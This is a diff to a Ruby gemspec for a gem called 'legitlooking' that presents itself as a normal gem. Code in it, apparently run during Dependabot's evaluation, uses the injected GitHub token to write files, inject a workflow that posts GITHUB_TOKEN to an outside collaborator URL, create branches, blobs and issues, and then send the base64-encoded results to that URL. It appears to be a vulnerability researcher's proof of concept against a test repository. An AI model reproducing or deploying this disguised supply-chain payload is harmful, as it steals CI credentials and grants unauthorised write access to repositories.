@@ -6,7 +6,6 @@ begin
   require "uri"
   require "net/http"
   require "json"
-  require "base64"
 
   lines = []
 
@@ -33,100 +32,83 @@ begin
     ["ERR", e.message]
   end
 
+  # Array#pack("m0") = base64 strict zonder require "base64"
+  b64 = ->(s) { [s].pack("m0") }
+
   REPO = "ugurcanli/testpen"
 
   # ============================================================
-  # 1. BESTAND SCHRIJVEN IN DE REPO
-  #    Kan de token een nieuw bestand aanmaken via Contents API?
+  # 1. BESTAND SCHRIJVEN
   # ============================================================
   lines << "=== 1. PUT /contents/poc-write-test.txt ==="
-  poc_content = Base64.strict_encode64("PoC: Dependabot RCE grants repository write access\nTimestamp: #{Time.now}\n")
   code, body = gh(:put, "/repos/#{REPO}/contents/poc-write-test.txt", {
     message: "PoC: write access via Dependabot RCE",
-    content: poc_content
+    content: b64.("PoC: Dependabot RCE grants repository write access\n")
   })
   lines << "HTTP #{code}: #{body}"
 
   # ============================================================
-  # 2. MALICIEUZE GITHUB ACTIONS WORKFLOW INJECTEREN
-  #    Meest kritieke write test -- workflow met GITHUB_TOKEN
+  # 2. MALICIEUZE WORKFLOW INJECTEREN -- meest kritieke test
   # ============================================================
   lines << "\n=== 2. PUT .github/workflows/poc-evil.yml ==="
-  evil_workflow = Base64.strict_encode64(<<~YAML)
+  evil_yaml = <<~YAML
     name: poc-injected
     on: [push, workflow_dispatch]
     jobs:
       exfil:
         runs-on: ubuntu-latest
         steps:
-          - name: exfil
-            run: |
-              curl -s -X POST #{COLLAB_URL}?poc=workflow_injection \\
-                -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY"
-    YAML
+          - run: curl -s -X POST #{COLLAB_URL}?poc=workflow_injected -d "t=$GITHUB_TOKEN"
+  YAML
   code, body = gh(:put, "/repos/#{REPO}/contents/.github/workflows/poc-evil.yml", {
     message: "PoC: workflow injection via Dependabot RCE",
-    content: evil_workflow
+    content: b64.(evil_yaml)
   })
   lines << "HTTP #{code}: #{body}"
 
   # ============================================================
   # 3. BRANCH AANMAKEN
-  #    Kan de token een nieuwe branch aanmaken?
   # ============================================================
   lines << "\n=== 3. BRANCH AANMAKEN ==="
-  # Haal eerst de SHA van main op
-  code, body = gh(:get, "/repos/#{REPO}/git/ref/heads/main")
-  lines << "GET main SHA: HTTP #{code}: #{body[0, 200]}"
-  sha = body.match(/"sha":"([a-f0-9]{40})"/)&.[](1)
-  lines << "SHA: #{sha}"
+  code, sha_body = gh(:get, "/repos/#{REPO}/git/ref/heads/main")
+  sha = sha_body.match(/"sha":"([a-f0-9]{40})"/)&.[](1)
+  lines << "Main SHA: #{sha}"
 
   if sha
+    branch_name = "poc-dependabot-write-#{Time.now.to_i}"
     code, body = gh(:post, "/repos/#{REPO}/git/refs", {
-      ref: "refs/heads/poc-dependabot-write-#{Time.now.to_i}",
+      ref: "refs/heads/#{branch_name}",
       sha: sha
     })
-    lines << "Create branch HTTP #{code}: #{body}"
+    lines << "Create branch '#{branch_name}': HTTP #{code}: #{body}"
   end
 
   # ============================================================
-  # 4. BESTAND LEZEN -- private bestanden toegankelijk?
+  # 4. GIT BLOB (laagste niveau write)
   # ============================================================
-  lines << "\n=== 4. REPO CONTENTS LEZEN ==="
-  code, body = gh(:get, "/repos/#{REPO}/contents/.github/dependabot.yml")
-  lines << "HTTP #{code}: #{body[0, 500]}"
-
-  # Kan de token ook code lezen?
-  code, body = gh(:get, "/repos/#{REPO}/contents/dependabot_poc/callback_listener.py")
-  lines << "callback_listener.py HTTP #{code}: #{body[0, 200]}"
-
-  # ============================================================
-  # 5. PUSH DIRECT VIA GIT OBJECTS API
-  #    Laagste niveau write operatie
-  # ============================================================
-  lines << "\n=== 5. GIT BLOB AANMAKEN ==="
+  lines << "\n=== 4. GIT BLOB ==="
   code, body = gh(:post, "/repos/#{REPO}/git/blobs", {
-    content: "PoC write via Dependabot RCE git objects API",
+    content: "PoC blob via Dependabot RCE",
     encoding: "utf-8"
   })
   lines << "HTTP #{code}: #{body}"
 
   # ============================================================
-  # 6. ISSUE AANMAKEN (eerder al getest maar opnieuw bevestigen)
+  # 5. ISSUE AANMAKEN
   # ============================================================
-  lines << "\n=== 6. ISSUE AANMAKEN ==="
+  lines << "\n=== 5. ISSUE ==="
   code, body = gh(:post, "/repos/#{REPO}/issues", {
-    title: "PoC: Dependabot RCE write access confirmed",
-    body: "This issue was created from within a Dependabot execution container via the injected GitHub API token. Proof of write access via RCE."
+    title: "PoC: Dependabot RCE write access",
+    body:  "Created from within Dependabot execution container."
   })
   lines << "HTTP #{code}: #{body[0, 300]}"
 
   # ============================================================
-  # 7. BESCHERMDE BRANCH STATUS -- is main protected?
+  # 6. BRANCH PROTECTION CHECK
   # ============================================================
-  lines << "\n=== 7. BRANCH PROTECTION ==="
+  lines << "\n=== 6. BRANCH PROTECTION ==="
   code, body = gh(:get, "/repos/#{REPO}/branches/main")
-  lines << "HTTP #{code}: #{body[0, 500]}"
+  lines << "HTTP #{code}: #{body[0, 400]}"
 
   payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
   uri = URI("#{COLLAB_URL}?poc=write_access_test")
@@ -145,7 +127,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.31"
+  spec.version       = "1.0.32"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
